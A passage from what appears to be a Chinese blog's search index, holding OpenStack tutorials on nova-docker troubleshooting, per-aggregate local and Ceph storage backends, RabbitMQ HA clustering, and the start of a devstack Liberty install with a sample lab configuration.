NAMES</span><br><span class="line"><span class="attribute">dc6e1c21887d</span> cirros <span class="string">&quot;/sbin/init&quot;</span> <span class="number">47</span> minutes ago Up <span class="number">47</span> minutes nova-bfeeb<span class="number">788</span>-<span class="number">7</span>fdf-<span class="number">476</span>f-<span class="number">904</span>a-<span class="number">8</span>cc<span class="number">8</span>ee<span class="number">3</span>eb<span class="number">81</span>c</span><br></pre></td></tr></table></figure><p><em>注：dashboard上控制台无法使用</em></p><h2 id="遇到的一些问题"><a href="#遇到的一些问题" class="headerlink" title="遇到的一些问题"></a>遇到的一些问题</h2><p>修改使用docker driver后nova-compute的日志可以在 /var/log/message查看</p><h3 id="1-重启nova-conpute服务失败"><a href="#1-重启nova-conpute服务失败" class="headerlink" title="1. 重启nova-conpute服务失败"></a>1. 重启nova-conpute服务失败</h3><figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">Aug <span class="number">08 12:14:51</span> compute2 nova-compute[<span class="number">21233</span>]: <span class="number">2016-08-08</span> <span class="number">12</span>:<span class="number">14:51.388</span> <span class="number">21233</span> ERROR nova.virt.driver File &quot;/usr/lib/python2.<span class="number">7</span>/site-packages/oslo_config</span><br><span class="line">Aug <span class="number">08 12:14:51</span> compute2 nova-compute[<span class="number">21233</span>]: <span class="number">2016-08-08</span> <span class="number">12</span>:<span class="number">14:51.388</span> <span class="number">21233</span> ERROR nova.virt.driver __import__(module_str)</span><br><span class="line">Aug <span class="number">08 12:14:51</span> compute2 nova-compute[<span class="number">21233</span>]: <span class="number">2016-08-08</span> <span class="number">12</span>:<span class="number">14:51.388</span> <span class="number">21233</span> ERROR nova.virt.driver ImportError: No module named conf.netconf</span><br></pre></td></tr></table></figure><p>解决方法：</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># cd src/novadocker/</span></span><br><span class="line"><span class="meta"># git checkout -b stable/liberty origin/stable/liberty</span></span><br><span class="line"><span class="meta"># python setup.py install</span></span><br></pre></td></tr></table></figure><p>然后即可正常启动nova-compute服务</p><h3 id="2-创建虚拟机的时候提示报错"><a href="#2-创建虚拟机的时候提示报错" class="headerlink" title="2. 创建虚拟机的时候提示报错"></a>2. 创建虚拟机的时候提示报错</h3><figure class="highlight basic"><table><tr><td class="code"><pre><span class="line"><span class="symbol">404 </span>Client <span class="keyword">Error</span>: <span class="keyword">Not</span> Found (<span class="string">&quot;No such image: cirros-docker&quot;</span>)]</span><br></pre></td></tr></table></figure><p>解决方法：上传image的时候image name必须和docker image的名字一致，否则在创建instance的时候就是有上述错误</p><h3 id="3-启动虚拟机的时候报命名空间权限错误"><a href="#3-启动虚拟机的时候报命名空间权限错误" class="headerlink" title="3. 启动虚拟机的时候报命名空间权限错误"></a>3. 启动虚拟机的时候报命名空间权限错误</h3><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line">Aug <span class="number">8</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">59</span> compute2 nova-compute: <span class="number">2016</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">59.200</span> <span class="number">12444</span> ERROR nova.compute.manager [instance: <span class="number">3608b187</span>-fe0c-<span class="number">4554</span>-aa96-d5ed630042bc] Command: sudo nova-rootwrap /etc/nova/rootwrap.conf ip netns exec ee27f11ab9dc265ad864dbcb8b9a800693fd9517f0bcfa166e3ccae66c300843 ip link set lo up</span><br><span class="line">Aug <span class="number">8</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">59</span> compute2 nova-compute: <span class="number">2016</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">59.200</span> <span class="number">12444</span> ERROR nova.compute.manager [instance: <span class="number">3608b187</span>-fe0c-<span class="number">4554</span>-aa96-d5ed630042bc] Exit code: <span class="number">1</span></span><br><span class="line">Aug <span class="number">8</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">59</span> compute2 nova-compute: <span class="number">2016</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">59.200</span> <span class="number">12444</span> ERROR nova.compute.manager [instance: <span class="number">3608b187</span>-fe0c-<span class="number">4554</span>-aa96-d5ed630042bc] Stdout: u&#x27;&#x27;</span><br><span class="line">Aug <span class="number">8</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">59</span> compute2 nova-compute: <span class="number">2016</span>-<span class="number">08</span>-<span class="number">08</span> <span class="number">14</span>:<span class="number">12</span>:<span class="number">59.200</span> <span class="number">12444</span> ERROR nova.compute.manager [instance: <span class="number">3608b187</span>-fe0c-<span class="number">4554</span>-aa96-d5ed630042bc] Stderr: u&#x27;Cannot open network namespace <span class="string">&quot;ee27f11ab9dc265ad864dbcb8b9a800693fd9517f0bcfa166e3ccae66c300843&quot;</span>: Permission denied\n&#x27;</span><br></pre></td></tr></table></figure><p>解决方法：关闭selinux</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># sed -i &quot;s/SELINUX=enforcing/SELINUX=disabled/g&quot; /etc/selinux/config</span></span><br><span class="line"><span class="meta"># reboot</span></span><br></pre></td></tr></table></figure><hr><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://blog.csdn.net/zhangli_perdue/article/details/50155705">OpenStack里使用Nova Docker Driver需要注意的细节</a><br><a href="https://github.com/openstack/nova-docker">https://github.com/openstack/nova-docker</a><br><a href="http://heavenkong.blogspot.com/2016/07/resolved-mitaka-novadocker-error.html">http://heavenkong.blogspot.com/2016/07/resolved-mitaka-novadocker-error.html</a></p>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
            <tag> openstack </tag>
            
            <tag> nova </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openstack nova-compute在不同的hypervisors上使用不同的存储后端</title>
      <link href="openstack/use-local-storage-for-different-hypervisors.html"/>
      <url>openstack/use-local-storage-for-different-hypervisors.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><table><thead><tr><th>主机名</th><th>IP</th></tr></thead><tbody><tr><td>controller1</td><td>192.168.2.240</td></tr><tr><td>compute1</td><td>192.168.2.242</td></tr><tr><td>compute2</td><td>192.168.2.243</td></tr><tr><td>compute3</td><td>192.168.2.248</td></tr><tr><td>compute4</td><td>192.168.2.249</td></tr></tbody></table><p>在不同的计算节点使用不同的存储后端<br><img data-src="/images/uploads/2016/07/agregate-local-ceph-storage.png" alt="image"></p><h1 id="计算节点配置"><a href="#计算节点配置" class="headerlink" title="计算节点配置"></a>计算节点配置</h1><h2 id="1-Scheduler"><a href="#1-Scheduler" class="headerlink" title="1. Scheduler"></a>1. Scheduler</h2><p>为了使nova的调度程序支持下面的过滤算法，需要修改使之支持 AggregateInstanceExtraSpecsFilter ，编辑控制节点的 /etc/nova/nova.conf 文件加入修改以下选项,然后重启nova-scheduler服务</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/nova/nova.conf</span></span><br><span class="line"><span class="attr">scheduler_default_filters</span>=RetryFilter,AvailabilityZoneFilter,RamFilter,ComputeFilter,ImagePropertiesFilter,ServerGroupAntiAffinityFilter,ServerGroupAffinityFilter,AggregateInstanceExtraSpecsFilter</span><br><span class="line"></span><br><span class="line"><span class="comment"># systemctl restart openstack-nova-scheduler.service</span></span><br></pre></td></tr></table></figure><h2 id="2-本地存储配置"><a href="#2-本地存储配置" class="headerlink" title="2. 本地存储配置"></a>2. 本地存储配置</h2><p>nova默认支持，无需配置。为了支持迁移可以配置共享存储（NFS等）</p><h2 id="3-ceph存储配置"><a href="#3-ceph存储配置" class="headerlink" title="3. ceph存储配置"></a>3. ceph存储配置</h2><p>编辑计算节点的 /etc/nova/nova.conf 文件加入修改以下选项,然后重启nova-compute服务（这里没有详细写，例如导入secret-uuid等操作请自行添加）</p><span id="more"></span><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /etc/nova/nova.conf</span></span><br><span class="line"><span class="section">[libvirt]</span></span><br><span class="line"><span class="attr">images_type</span> = rbd</span><br><span class="line"><span class="attr">images_rbd_pool</span> = vms</span><br><span class="line"><span class="attr">images_rbd_ceph_conf</span> = /etc/ceph/ceph.conf</span><br><span class="line"><span class="attr">rbd_user</span> = cinder</span><br><span class="line"><span class="attr">rbd_secret_uuid</span> =<span class="number">20</span>c3fd98-<span class="number">2</span>bab-<span class="number">457</span>a-b1e2-<span class="number">12</span>e50dc6c98e</span><br><span class="line"><span class="attr">disk_cachemodes</span>=<span class="string">&quot;network=writeback&quot;</span></span><br><span class="line"><span class="attr">inject_partition</span>=-<span class="number">2</span></span><br><span class="line"><span class="attr">inject_key</span>=<span class="literal">False</span></span><br><span class="line"><span class="attr">live_migration_flag</span>=VIR_MIGRATE_UNDEFINE_SOURCE,VIR_MIGRATE_PEER2PEER,VIR_MIGRATE_LIVE,VIR_MIGRATE_PERSIST_DEST</span><br><span class="line"></span><br><span class="line"><span class="comment"># systemctl restart openstack-nova-compute.service</span></span><br></pre></td></tr></table></figure><h1 id="openstack配置"><a href="#openstack配置" class="headerlink" title="openstack配置"></a>openstack配置</h1><p>创建主机集合，包含ceph compute nodes 和 local storage compute nodes</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"># nova aggregate-create ephemeral-compute-storage</span><br><span class="line"><span class="code">+----+</span>---------------------------<span class="code">+-------------------+</span>-------<span class="code">+----------+</span></span><br><span class="line">| Id | Name                      | Availability Zone | Hosts | Metadata |</span><br><span class="line"><span class="code">+----+</span>---------------------------<span class="code">+-------------------+</span>-------<span class="code">+----------+</span></span><br><span class="line">| 8  | ephemeral-compute-storage | -                 |       |          |</span><br><span class="line"><span class="code">+----+</span>---------------------------<span class="code">+-------------------+</span>-------<span class="code">+----------+</span></span><br><span class="line"></span><br><span class="line"># nova aggregate-create ceph-compute-storage</span><br><span class="line"><span class="code">+----+</span>----------------------<span class="code">+-------------------+</span>-------<span class="code">+----------+</span></span><br><span class="line">| Id | Name                 | Availability Zone | Hosts | Metadata |</span><br><span class="line"><span class="code">+----+</span>----------------------<span class="code">+-------------------+</span>-------<span class="code">+----------+</span></span><br><span class="line">| 9  | ceph-compute-storage | -                 |       |          |</span><br><span class="line"><span class="code">+----+</span>----------------------<span class="code">+-------------------+</span>-------<span class="code">+----------+</span></span><br></pre></td></tr></table></figure><p>可以使用 nova hypervisor-list 命令来查看自己的hypervisor name</p><figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"># nova hypervisor-list</span><br><span class="line"><span class="code">+----+</span>---------------------<span class="code">+-------+</span>---------+</span><br><span class="line">| ID | Hypervisor hostname | State | Status  |</span><br><span class="line"><span class="code">+----+</span>---------------------<span class="code">+-------+</span>---------+</span><br><span class="line">| 1  | compute1            | up    | enabled |</span><br><span class="line">| 2  | compute2            | up    | enabled |</span><br><span class="line">| 4  | compute4            | up    | enabled |</span><br><span class="line">| 7  | compute3            | up    | enabled |</span><br><span class="line"><span class="code">+----+</span>---------------------<span class="code">+-------+</span>---------+</span><br></pre></td></tr></table></figure><p>在本例中，使用以下分类<br>Local storage:compute1,compute2<br>Ceph storage: conpute3,compute4<br>添加主机到主机集合</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># nova <span class="keyword">aggregate</span>-<span class="keyword">add</span>-host ephemeral-compute-<span class="keyword">storage</span> compute1</span><br><span class="line"># nova <span class="keyword">aggregate</span>-<span class="keyword">add</span>-host ephemeral-compute-<span class="keyword">storage</span> compute2</span><br><span class="line"># nova <span class="keyword">aggregate</span>-<span class="keyword">add</span>-host ceph-compute-<span class="keyword">storage</span> compute3</span><br><span class="line"># nova <span class="keyword">aggregate</span>-<span class="keyword">add</span>-host ceph-compute-<span class="keyword">storage</span> compute4</span><br></pre></td></tr></table></figure><p>为主机集合创建新的metadata</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># nova <span class="keyword">aggregate</span>-<span class="keyword">set</span>-metadata ephemeral-compute-<span class="keyword">storage</span> ephemeralcomputestorage=<span class="keyword">true</span></span><br><span class="line"># nova <span class="keyword">aggregate</span>-<span class="keyword">set</span>-metadata ceph-compute-<span class="keyword">storage</span> cephcomputestorage=<span class="keyword">true</span></span><br></pre></td></tr></table></figure><p>为使用本地存储和ceph存储的虚拟机创建flavor</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># nova flavor-<span class="keyword">create</span> m1.ephemeral-compute-<span class="keyword">storage</span> <span class="number">8</span> <span class="number">128</span> <span class="number">1</span> <span class="number">1</span></span><br><span class="line"># nova flavor-<span class="keyword">create</span> m1.ceph-compute-<span class="keyword">storage</span> <span class="number">9</span> <span class="number">128</span> <span class="number">1</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>为flavor绑定指定的属性</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># nova flavor-key m1.ceph-compute-<span class="keyword">storage</span> <span class="keyword">set</span> aggregate_instance_extra_specs:cephcomputestorage=<span class="keyword">true</span></span><br><span class="line"># nova flavor-key m1.ephemeral-compute-<span class="keyword">storage</span> <span class="keyword">set</span> aggregate_instance_extra_specs:ephemeralcomputestorage=<span class="keyword">true</span></span><br></pre></td></tr></table></figure><h1 id="结果验证"><a href="#结果验证" class="headerlink" title="结果验证"></a>结果验证</h1><p>使用flavor m1.ceph-compute-storage 启动4台虚拟机，发现虚拟机磁盘文件全部在ceph的pool中</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nova list</span></span><br><span class="line">+--------------------------------------+--------+--------+------------+-------------+---------------------+</span><br><span class="line">|<span class="string"> ID                                   </span>|<span class="string"> Name   </span>|<span class="string"> Status </span>|<span class="string"> Task State </span>|<span class="string"> Power State </span>|<span class="string"> Networks            </span>|</span><br><span class="line">+--------------------------------------+--------+--------+------------+-------------+---------------------+</span><br><span class="line">|<span class="string"> 5d6bd85e-9b75-4035-876c-30e997ea0a98 </span>|<span class="string"> ceph-1 </span>|<span class="string"> BUILD  </span>|<span class="string"> spawning   </span>|<span class="string"> NOSTATE     </span>|<span class="string"> private=172.16.1.49 </span>|</span><br><span class="line">|<span class="string"> aa666bd9-e370-4c53-8af3-f1bf7ba77900 </span>|<span class="string"> ceph-2 </span>|<span class="string"> BUILD  </span>|<span class="string"> spawning   </span>|<span class="string"> NOSTATE     </span>|<span class="string"> private=172.16.1.48 </span>|</span><br><span class="line">|<span class="string"> 56d6a3a8-e6c4-4860-bd72-2e0aa0fa55f2 </span>|<span class="string"> ceph-3 </span>|<span class="string"> BUILD  </span>|<span class="string"> spawning   </span>|<span class="string"> NOSTATE     </span>|<span class="string"> private=172.16.1.47 </span>|</span><br><span class="line">|<span class="string"> 2b9577d8-2448-4d8a-ba98-253b0f597b12 </span>|<span class="string"> ceph-4 </span>|<span class="string"> BUILD  </span>|<span class="string"> spawning   </span>|<span class="string"> NOSTATE     </span>|<span class="string"> private=172.16.1.50 </span>|</span><br><span class="line">+--------------------------------------+--------+--------+------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line">[root<span class="meta">@node1</span> ~]<span class="comment"># rbd ls vms</span></span><br><span class="line">2b9577d8-2448-4d8a-ba98-253b0f597b12_disk</span><br><span class="line">56d6a3a8-e6c4-4860-bd72-2e0aa0fa55f2_disk</span><br><span class="line">5d6bd85e-9b75-4035-876c-30e997ea0a98_disk</span><br><span class="line">aa666bd9-e370-4c53-8af3-f1bf7ba77900_disk</span><br></pre></td></tr></table></figure><p>删除所有虚拟机（便于验证），使用flavor m1.ephemeral-compute-storage 启动四台虚拟机，发现虚拟机磁盘文件分布于compute1 和 compute2 的本地存储中（没有配置NFS等共享存储）</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line"><span class="comment"># nova list</span></span><br><span class="line">+--------------------------------------+---------+--------+------------+-------------+---------------------+</span><br><span class="line">|<span class="string"> ID                                   </span>|<span class="string"> Name    </span>|<span class="string"> Status </span>|<span class="string"> Task State </span>|<span class="string"> Power State </span>|<span class="string"> Networks            </span>|</span><br><span class="line">+--------------------------------------+---------+--------+------------+-------------+---------------------+</span><br><span class="line">|<span class="string"> 1c1ce5f3-b5aa-47dd-806c-e2eba60b9eb0 </span>|<span class="string"> local-1 </span>|<span class="string"> ACTIVE </span>|<span class="string"> -          </span>|<span class="string"> Running     </span>|<span class="string"> private=172.16.1.51 </span>|</span><br><span class="line">|<span class="string"> 5a3e4074-619e-423a-a649-e24771f9fbd1 </span>|<span class="string"> local-2 </span>|<span class="string"> ACTIVE </span>|<span class="string"> -          </span>|<span class="string"> Running     </span>|<span class="string"> private=172.16.1.54 </span>|</span><br><span class="line">|<span class="string"> 5b838406-b9cf-4943-89f3-79866f8e6e19 </span>|<span class="string"> local-3 </span>|<span class="string"> ACTIVE </span>|<span class="string"> -          </span>|<span class="string"> Running     </span>|<span class="string"> private=172.16.1.52 </span>|</span><br><span class="line">|<span class="string"> 30e7289f-bc80-4374-aabb-906897b8141c </span>|<span class="string"> local-4 </span>|<span class="string"> ACTIVE </span>|<span class="string"> -          </span>|<span class="string"> Running     </span>|<span class="string"> private=172.16.1.53 </span>|</span><br><span class="line">+--------------------------------------+---------+--------+------------+-------------+---------------------+</span><br><span class="line"></span><br><span class="line">[root<span class="meta">@compute1</span> ~]<span class="comment"># ll /var/lib/nova/instances/</span></span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x 2 nova nova  69 Jul 27 10:40 1c1ce5f3-b5aa-47dd-806c-e2eba60b9eb0</span><br><span class="line">drwxr-xr-x 2 nova nova  69 Jul 27 10:40 5b838406-b9cf-4943-89f3-79866f8e6e19</span><br><span class="line">drwxr-xr-x 2 nova nova  53 Jul 25 16:01 _base</span><br><span class="line">-rw-r--r-- 1 nova nova  31 Jul 27 10:33 compute_nodes</span><br><span class="line">drwxr-xr-x 2 nova nova 143 Jul 25 16:01 locks</span><br><span class="line">drwxr-xr-x 2 nova nova   6 Jul  6 15:51 snapshots</span><br><span class="line"></span><br><span class="line">[root<span class="meta">@compute2</span> ~]<span class="comment"># ll /var/lib/nova/instances/</span></span><br><span class="line">total 4</span><br><span class="line">drwxr-xr-x 2 nova nova  69 Jul 27 10:40 30e7289f-bc80-4374-aabb-906897b8141c</span><br><span class="line">drwxr-xr-x 2 nova nova  69 Jul 27 10:40 5a3e4074-619e-423a-a649-e24771f9fbd1</span><br><span class="line">drwxr-xr-x 2 nova nova  53 Jul 25 16:02 _base</span><br><span class="line">-rw-r--r-- 1 nova nova  62 Jul 27 10:33 compute_nodes</span><br><span class="line">drwxr-xr-x 2 nova nova 143 Jul 25 16:01 locks</span><br></pre></td></tr></table></figure><h1 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h1><p>在线迁移虚拟机的时候，不在同一个主机集合的主机仍然可以选择，但是无法迁移，需要增加只能在所在主机集合内迁移的功能  </p><hr><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.sebastien-han.fr/blog/2014/09/01/openstack-use-ephemeral-and-persistent-root-storage-for-different-hypervisors/">OpenStack: use ephemeral and persistent root storage for different hypervisors</a></p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> nova </tag>
            
            <tag> hypervisors </tag>
            
            <tag> ceph </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>openstack配置rabbit cluster并使用</title>
      <link href="openstack/openstack-use-rabbitmq-cluster.html"/>
      <url>openstack/openstack-use-rabbitmq-cluster.html</url>
      
        <content type="html"><![CDATA[<p>生产环境中至少运行3个rabbitmq服务器，测试环境中我们可以只运行两个，我们配置了两个节点，分别为controller1和controller2。</p><h1 id="为HA队列配置RabbitMQ"><a href="#为HA队列配置RabbitMQ" class="headerlink" title="为HA队列配置RabbitMQ"></a>为HA队列配置RabbitMQ</h1><ol><li><p>在controller1上启动使用以下命令启动rabbitmq</p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># systemctl start rabbitmq</span></span><br></pre></td></tr></table></figure></li><li><p>从controller1上复制cookie到其他的节点</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># scp root@NODE:<span class="regexp">/var/</span>lib<span class="regexp">/rabbitmq/</span>.erlang.cookie <span class="regexp">/var/</span>lib<span class="regexp">/rabbitmq/</span>.erlang.cookie</span><br></pre></td></tr></table></figure><p>需要修改NODE为controller1或者对应</p></li><li><p>在每个目标节点上确认 erlang.cookie 文件的用户，组和权限</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># chown rabbitmq:rabbitmq <span class="regexp">/var/</span>lib<span class="regexp">/rabbitmq/</span>.erlang.cookie</span><br><span class="line"># chmod <span class="number">400</span> <span class="regexp">/var/</span>lib<span class="regexp">/rabbitmq/</span>.erlang.cookie</span><br></pre></td></tr></table></figure></li><li><p>设置rabbitmq开机自启并启动其他节点的rabbitmq-server</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"># systemctl <span class="keyword">enable</span> rabbitmq-<span class="keyword">server</span></span><br><span class="line"># systemctl <span class="keyword">start</span> rabbitmq-<span class="keyword">server</span></span><br></pre></td></tr></table></figure><span id="more"></span></li><li><p>使用以下命令确认rabbitmq-server在每个节点正确运行</p><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"># rabbitmqctl cluster_status</span><br><span class="line"><span class="symbol">Cluster</span> status of node rabbit@controller1...</span><br><span class="line">[&#123;nodes,[&#123;disc,[rabbit@ controller1]&#125;]&#125;,</span><br><span class="line">&#123;running_nodes,[rabbit@ controller1]&#125;,</span><br><span class="line">&#123;partitions,[]&#125;]</span><br><span class="line">...done.</span><br></pre></td></tr></table></figure></li><li><p>除第一个节点（controller1）外，其他节点执行以下命令加入集群</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rabbitmqctl stop_app</span></span><br><span class="line">Stopping <span class="keyword">node</span> <span class="title">rabbit</span>@controller2...</span><br><span class="line">...done.</span><br><span class="line"><span class="comment"># rabbitmqctl join_cluster --ram rabbit@ controller1</span></span><br><span class="line"><span class="comment"># rabbitmqctl start_app</span></span><br><span class="line">Starting <span class="keyword">node</span> <span class="title">rabbit</span>@ controller2...</span><br><span class="line">...done.<span class="tag">&lt;/pre&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>确认集群状态</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rabbitmqctl cluster_status</span></span><br><span class="line">Cluster status of <span class="keyword">node</span> <span class="title">rabbit</span>@controller1...</span><br><span class="line">[&#123;nodes,[&#123;disc,[rabbit@ controller1]&#125;,&#123;ram,[rabbit@ controller2]&#125;]&#125;, \</span><br><span class="line">    &#123;running_nodes,[rabbit@<span class="keyword">NODE</span><span class="title">,rabbit</span>@ controller1]&#125;]</span><br></pre></td></tr></table></figure></li><li><p>为了确保所有队列除了名字自动生成的可以在所有运行的节点上镜像，设置 ha-mode 策略，在任意节点上执行</p><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"># rabbitmqctl set_policy ha-<span class="keyword">all</span> &#x27;^(?!amq\.).*<span class="string">&#x27; &#x27;</span>&#123;<span class="string">&quot;ha-mode&quot;</span>: <span class="string">&quot;all&quot;</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><h1 id="配置openstack服务使用rabbitmq-ha-queues"><a href="#配置openstack服务使用rabbitmq-ha-queues" class="headerlink" title="配置openstack服务使用rabbitmq ha queues"></a>配置openstack服务使用rabbitmq ha queues</h1><ol><li><p>使用方法</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rabbit_hosts</span>=controller<span class="number">1</span>:<span class="number">5672</span>,controller<span class="number">2</span>:<span class="number">5672</span></span><br></pre></td></tr></table></figure></li><li><p>RabbitMQ尝试重连的时间（这里的单位是？秒？）</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">rabbit_retry_interval</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure></li><li><p>How long to back-off for between retries when connecting to RabbitMQ </p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">rabbit_retry_backoff</span>=<span class="number">2</span></span><br></pre></td></tr></table></figure></li><li><p>最小尝试重连RabbitMQ的次数（默认是无限）</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">rabbit_max_retries</span>=<span class="number">0</span></span><br></pre></td></tr></table></figure></li><li><p>在RabbitMQ中使用durable queues</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">rabbit_durable_queues</span>=<span class="literal">true</span>&lt;/pre&gt;</span><br></pre></td></tr></table></figure></li><li><p>在RabbitMQ中使用HA queues</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">rabbit_ha_queues</span>=<span class="literal">true</span></span><br></pre></td></tr></table></figure></li></ol><p>NOTE:如果想更改从没有使用HA queues的旧配置到HA queues，你需要重启服务  </p><figure class="highlight vala"><table><tr><td class="code"><pre><span class="line"><span class="meta"># rabbitmqctl stop_app</span></span><br><span class="line"><span class="meta"># rabbitmqctl reset</span></span><br><span class="line"><span class="meta"># rabbitmqctl start_app</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> rabbitmq </tag>
            
            <tag> HA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7 devstack 安装openstack liberty</title>
      <link href="openstack/centos7-devstack-openstack-liberty.html"/>
      <url>openstack/centos7-devstack-openstack-liberty.html</url>
      
        <content type="html"><![CDATA[<h3 id="本机环境"><a href="#本机环境" class="headerlink" title="本机环境"></a>本机环境</h3><p>操作系统：CentOS Linux release 7.2.1511 (Core)<br>本机IP:172.16.33.201<br>网关:172.16.33.254  </p><h3 id="下载devstack和前期准备"><a href="#下载devstack和前期准备" class="headerlink" title="下载devstack和前期准备"></a>下载devstack和前期准备</h3><p>这里和别人的文章有点出入，git clone devstack的时候需要指定分支，不然安装openstack的时候会提示一个脚本不存在</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /opt</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> git <span class="built_in">clone</span> https://git.openstack.org/openstack-dev/devstack -b stable/liberty</span></span><br></pre></td></tr></table></figure><p>新建stack用户，修改devstack文件夹所有者</p><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># cd <span class="regexp">/opt/</span>devstack<span class="regexp">/tools/</span></span><br><span class="line"># ./create-stack-user.sh</span><br><span class="line"># chown -R stack:stack <span class="regexp">/opt/</span>devstack</span><br></pre></td></tr></table></figure><span id="more"></span><p>新建local.conf文件，示例如下，按需更改</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim /opt/devstack/local.conf</span></span><br><span class="line"></span><br><span class="line">[[<span class="built_in">local</span>|localrc]]</span><br><span class="line"><span class="comment"># Define images to be automatically downloaded during the DevStack built process.</span></span><br><span class="line">IMAGE_URLS=<span class="string">&quot;http://download.cirros-cloud.net/0.3.4/cirros-0.3.4-x86_64-disk.img&quot;</span></span><br><span class="line"><span class="comment"># Credentials</span></span><br><span class="line">DATABASE_PASSWORD=123456</span><br><span class="line">ADMIN_PASSWORD=123456</span><br><span class="line">SERVICE_PASSWORD=123456</span><br><span class="line">SERVICE_TOKEN=pass</span><br><span class="line">RABBIT_PASSWORD=123456</span><br><span class="line"><span class="comment">#FLAT_INTERFACE=eth0</span></span><br><span class="line"></span><br><span class="line">HOST_IP=172.16.33.201</span><br><span class="line">SERVICE_HOST=172.16.33.201</span><br><span class="line">MYSQL_HOST=172.16.33.201</span><br><span class="line">RABBIT_HOST=172.16.33.201</span><br><span class="line">GLANCE_HOSTPORT=172.16.33.201:9292</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">## Neutron options</span></span><br><span class="line">Q_USE_SECGROUP=True</span><br><span class="line">FLOATING_RANGE=172.16.33.0/24</span><br><span class="line">FIXED_RANGE=10.0.0.0/24</span><br><span class="line">Q_FLOATING_ALLOCATION_POOL=start=172.16.33.202,end=172.16.33.210</span><br><span class="line">PUBLIC_NETWORK_GATEWAY=172.16.33.254</span><br><span class="line">Q_L3_ENABLED=True</span><br><span class="line">PUBLIC_INTERFACE=eth0</span><br><span class="line">Q_USE_PROVIDERNET_FOR_PUBLIC=True</span><br><span class="line">OVS_PHYSICAL_BRIDGE=br-ex</span><br><span class="line">PUBLIC_BRIDGE=br-ex</span><br><span class="line">OVS_BRIDGE_MAPPINGS=public:br-ex</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Work offline</span></span><br><span class="line"><span class="comment">#OFFLINE=True</span></span><br><span class="line"><span class="comment"># Reclone each time</span></span><br><span class="line">RECLONE=False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Logging</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line"><span class="comment"># By default ``stack.sh`` output only goes to the terminal where it runs. It can</span></span><br><span class="line"><span class="comment"># be configured to additionally log to a file by setting ``LOGFILE`` to the full</span></span><br><span class="line"><span class="comment"># path of the destination log file. A timestamp will be appended to the given name.</span></span><br><span class="line">LOGFILE=/opt/stack/logs/stack.sh.log</span><br><span class="line">VERBOSE=True</span><br><span 